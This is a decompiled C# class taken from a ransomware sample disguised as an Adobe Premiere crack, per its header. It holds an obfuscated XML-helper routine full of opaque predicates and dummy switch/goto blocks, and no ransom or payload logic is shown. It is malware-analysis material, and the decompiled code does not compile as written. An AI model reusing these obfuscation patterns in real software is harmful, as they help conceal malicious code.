// Decompiled with JetBrains decompiler
// Type: A.Z
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-0d2137d133179a2fbff7bf38a8125d4b74e9615aaa47b5f4a3056eccce7a8f6e.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Xml.Linq;

namespace A
{
  [DebuggerNonUserCode]
  [EditorBrowsable(EditorBrowsableState.Never)]
  [CompilerGenerated]
  internal sealed class Z
  {
    [EditorBrowsable(EditorBrowsableState.Never)]
    private Z()
    {
    }

    public static string get_Value(IEnumerable<XElement> source)
    {
      IEnumerator<XElement> enumerator;
      try
      {
        enumerator = source.GetEnumerator();
        if (enumerator.MoveNext())
          return enumerator.Current.Value;
label_3:
        switch (7)
        {
          case 0:
            goto label_3;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.get_Value);
              break;
            }
            break;
        }
      }
      finally
      {
        if ((enumerator == SE.T ? 1 : 0) == G.T(88))
        {
label_7:
          switch (4)
          {
            case 0:
              goto label_7;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
      return KE.T;
    }

    public static void set_Value(IEnumerable<XElement> source, string value)
    {
      IEnumerator<XElement> enumerator;
      try
      {
        enumerator = source.GetEnumerator();
        if (enumerator.MoveNext())
        {
          enumerator.Current.Value = value;
        }
        else
        {
label_3:
          switch (2)
          {
            case 0:
              goto label_3;
            default:
              if (true)
                break;
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.set_Value);
              break;
          }
        }
      }
      finally
      {
        if ((enumerator == SE.T ? 1 : 0) == G.T(92))
        {
label_7:
          switch (7)
          {
            case 0:
              goto label_7;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
    }

    public static string get_AttributeValue(IEnumerable<XElement> source, XName name)
    {
      IEnumerator<XElement> enumerator;
      try
      {
        enumerator = source.GetEnumerator();
        if (enumerator.MoveNext())
          return XE.T(enumerator.Current.Attribute(name));
label_3:
        switch (3)
        {
          case 0:
            goto label_3;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.get_AttributeValue);
              break;
            }
            break;
        }
      }
      finally
      {
        if ((enumerator == SE.T ? 1 : 0) == G.T(96))
        {
label_7:
          switch (5)
          {
            case 0:
              goto label_7;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
      return KE.T;
    }

    public static void set_AttributeValue(IEnumerable<XElement> source, XName name, string value)
    {
      IEnumerator<XElement> enumerator;
      try
      {
        enumerator = source.GetEnumerator();
        if (enumerator.MoveNext())
        {
          enumerator.Current.SetAttributeValue(name, (object) value);
        }
        else
        {
label_3:
          switch (1)
          {
            case 0:
              goto label_3;
            default:
              if (true)
                break;
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.set_AttributeValue);
              break;
          }
        }
      }
      finally
      {
        if ((enumerator == SE.T ? 1 : 0) == G.T(100))
        {
label_7:
          switch (3)
          {
            case 0:
              goto label_7;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
    }

    public static string get_AttributeValue(XElement source, XName name) => XE.T(source.Attribute(name));

    public static void set_AttributeValue(XElement source, XName name, string value) => source.SetAttributeValue(name, (object) value);

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XAttribute T(XName T, object E)
    {
      if (E != V.T)
        return new XAttribute(T, RuntimeHelpers.GetObjectValue(E));
label_1:
      switch (5)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.T);
          }
          return EE.T;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XAttribute T(XName T, XNamespace E)
    {
      XAttribute xattribute = new XAttribute(T, (object) E.NamespaceName);
      xattribute.AddAnnotation((object) E);
      return xattribute;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static object T(string[] T, XNamespace[] E, List<XAttribute> H, object U)
    {
      if ((U == V.T ? 1 : 0) == G.T(104))
      {
label_1:
        switch (7)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.T);
            }
            XElement U1 = DE.T(U);
            if ((U1 == C.T ? 1 : 0) == G.T(108))
            {
label_5:
              switch (6)
              {
                case 0:
                  goto label_5;
                default:
                  // ISSUE: reference to a compiler-generated method
                  return (object) Z.H(T, E, H, U1);
              }
            }
            else
            {
              IEnumerable U2 = ZE.T(U);
              if ((U2 == UE.T ? 1 : 0) == G.T(112))
              {
label_8:
                switch (3)
                {
                  case 0:
                    goto label_8;
                  default:
                    // ISSUE: reference to a compiler-generated method
                    return (object) Z.E(T, E, H, U2);
                }
              }
              else
                break;
            }
        }
      }
      return U;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static IEnumerable E(
      string[] T,
      XNamespace[] E,
      List<XAttribute> H,
      IEnumerable U)
    {
      if ((U == UE.T ? 1 : 0) != G.T(116))
        return U;
label_1:
      switch (5)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.E);
          }
          IEnumerable<XElement> source = RE.T((object) U);
          if ((source == IE.T ? 1 : 0) != G.T(120))
          {
            // ISSUE: object of a compiler-generated type is created
            // ISSUE: reference to a compiler-generated method
            return (IEnumerable) U.Cast<object>().Select<object, object>(new Func<object, object>(new Z.D(T, E, H).E));
          }
label_5:
          switch (7)
          {
            case 0:
              goto label_5;
            default:
              // ISSUE: object of a compiler-generated type is created
              // ISSUE: reference to a compiler-generated method
              return (IEnumerable) source.Select<XElement, XElement>(new Func<XElement, XElement>(new Z.D(T, E, H).T));
          }
      }
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XElement H(string[] T, XNamespace[] E, List<XAttribute> H, XElement U)
    {
      if ((U == C.T ? 1 : 0) == G.T(124))
      {
label_1:
        switch (5)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Z.H);
            }
            XAttribute nextAttribute;
            for (XAttribute xattribute1 = U.FirstAttribute; (xattribute1 == EE.T ? 1 : 0) == G.T(180); xattribute1 = nextAttribute)
            {
              nextAttribute = xattribute1.NextAttribute;
              if (xattribute1.IsNamespaceDeclaration)
              {
label_6:
                switch (4)
                {
                  case 0:
                    goto label_6;
                  default:
                    XNamespace T1 = xattribute1.Annotation<XNamespace>();
                    string localName1 = xattribute1.Name.LocalName;
                    if (((object) T1 == (object) O.T ? 1 : 0) == G.T(128))
                    {
label_8:
                      switch (5)
                      {
                        case 0:
                          goto label_8;
                        default:
                          int num1;
                          if (T != null)
                          {
label_10:
                            switch (1)
                            {
                              case 0:
                                goto label_10;
                              default:
                                if (E == null)
                                {
label_12:
                                  switch (6)
                                  {
                                    case 0:
                                      goto label_12;
                                  }
                                }
                                else
                                {
                                  num1 = G.T(136);
                                  goto label_15;
                                }
                                break;
                            }
                          }
                          num1 = G.T(132);
label_15:
                          if (num1 != 0)
                          {
label_16:
                            switch (4)
                            {
                              case 0:
                                goto label_16;
                              default:
                                int num2 = checked ((int) N.T(T) - G.T(140));
                                int num3 = G.T(144);
                                int num4 = num2;
                                int index = num3;
                                while (index <= num4)
                                {
                                  string str = T[index];
                                  XNamespace E1 = E[index];
                                  if (localName1.Equals(str))
                                  {
label_19:
                                    switch (2)
                                    {
                                      case 0:
                                        goto label_19;
                                      default:
                                        if (TE.T(T1, E1))
                                        {
label_21:
                                          switch (4)
                                          {
                                            case 0:
                                              goto label_21;
                                            default:
                                              xattribute1.Remove();
                                              break;
                                          }
                                        }
                                        xattribute1 = EE.T;
                                        goto label_27;
                                    }
                                  }
                                  else
                                    checked { index += G.T(148); }
                                }
label_26:
                                switch (5)
                                {
                                  case 0:
                                    goto label_26;
                                }
                                break;
                            }
                          }
label_27:
                          if ((xattribute1 == EE.T ? 1 : 0) == G.T(152))
                          {
label_28:
                            switch (4)
                            {
                              case 0:
                                goto label_28;
                              default:
                                if ((H == HE.T ? 1 : 0) == G.T(156))
                                {
label_30:
                                  switch (4)
                                  {
                                    case 0:
                                      goto label_30;
                                    default:
                                      int num5 = checked (H.Count - G.T(160));
                                      int num6 = G.T(164);
                                      int num7 = num5;
                                      int index = num6;
                                      while (index <= num7)
                                      {
                                        XAttribute xattribute2 = H[index];
                                        string localName2 = xattribute2.Name.LocalName;
                                        XNamespace E2 = xattribute2.Annotation<XNamespace>();
                                        if (((object) E2 == (object) O.T ? 1 : 0) == G.T(168))
                                        {
label_33:
                                          switch (6)
                                          {
                                            case 0:
                                              goto label_33;
                                            default:
                                              if (localName1.Equals(localName2))
                                              {
label_35:
                                                switch (4)
                                                {
                                                  case 0:
                                                    goto label_35;
                                                  default:
                                                    if (TE.T(T1, E2))
                                                    {
label_37:
                                                      switch (3)
                                                      {
                                                        case 0:
                                                          goto label_37;
                                                        default:
                                                          xattribute1.Remove();
                                                          break;
                                                      }
                                                    }
                                                    xattribute1 = EE.T;
                                                    goto label_43;
                                                }
                                              }
                                              else
                                                break;
                                          }
                                        }
                                        checked { index += G.T(172); }
                                      }
label_42:
                                      switch (3)
                                      {
                                        case 0:
                                          goto label_42;
                                      }
                                      break;
                                  }
                                }
label_43:
                                if ((xattribute1 == EE.T ? 1 : 0) == G.T(176))
                                {
label_44:
                                  switch (1)
                                  {
                                    case 0:
                                      goto label_44;
                                    default:
                                      xattribute1.Remove();
                                      H.Add(xattribute1);
                                      break;
                                  }
                                }
                                break;
                            }
                          }
                          break;
                      }
                    }
                    continue;
                }
              }
            }
label_51:
            switch (3)
            {
              case 0:
                goto label_51;
            }
            break;
        }
      }
      return U;
    }
  }
}
